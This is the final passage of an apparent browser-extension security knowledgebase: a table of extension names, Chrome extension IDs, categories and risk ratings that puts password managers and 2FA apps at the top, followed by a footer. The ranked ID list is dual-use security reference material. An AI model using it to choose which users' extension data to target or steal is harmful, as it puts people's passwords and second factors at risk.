| NordPass | fngmhnnpilhplakakhiehpjlijbhmngh | Password Manager | Critical |
| Authy | bkhpgcmmnpbncdjgphlglidemmjbkgbl | 2FA | High |
| Google Authenticator | gaedmjdfmmahhbjflckfbedjjbdkjaij | 2FA | High |
| Honey | mihdfbecejheednfigbpmocgncnflagh | Shopping | Medium |
| Grammarly | lghgdplbpbcklndbjbglmfenihfjbmgn | Productivity | Medium |
| uBlock Origin | gcbommkclmclpchllfjekcdkpbjddhjm | Ad Blocker | Low |
| Privacy Badger | pkehgijcmpdhfbdbbnkijodmijkbtrdg | Privacy | Low |
| Dark Reader | eimadpbcbfnmbkopoojfekhnkhdbieeh | Accessibility | Low |
| Google Drive | apdfllckaahabafndbhieahigkjlhalf | Cloud Storage | Medium |
| Chrome Remote Desktop | gbchcmhmhahfdphkhkmpfmihenigjmpp | Remote Access | High |
| Google Calendar | coobgpohoikkiipiblmjeljniedjfikd | Productivity | Low |
| Slack | lneaknkopdijkpnycmfgbbfgfjgfaodg | Communication | Medium |
| Discord | jeogkiiogjbmhmlabbfjlabbpcnppfcg | Communication | Medium |
| WhatsApp | clhhggbfdinjkjdffdmmjgehdephmdlf | Communication | Medium |
| Twitter | pgphnlopbfbfdkbmmklddjmibnncnohh | Social Media | Medium |
| LinkedIn | odlpjhnipdekfkdkameofobdmkcfleln | Social Media | Medium |
| Reddit | kohkgbebdchaogdbkhgmioefjcbpfjpe | Social Media | Medium |

---

> **END OF KNOWLEDGEBASE**
> 
> This knowledgebase is a living document. Update it regularly with new research findings, CVEs, and bug bounty writeups.
> 
> **Last Updated**: 2026-05-24
> **Contributors**: PortSwigger Research, Chrome/Mozilla Docs, GitHub Community, Bug Bounty Researchers, IIT Jammu 2025 Study
> **License**: Research and Educational Use Only
> **Version**: 2026.05-v1.0

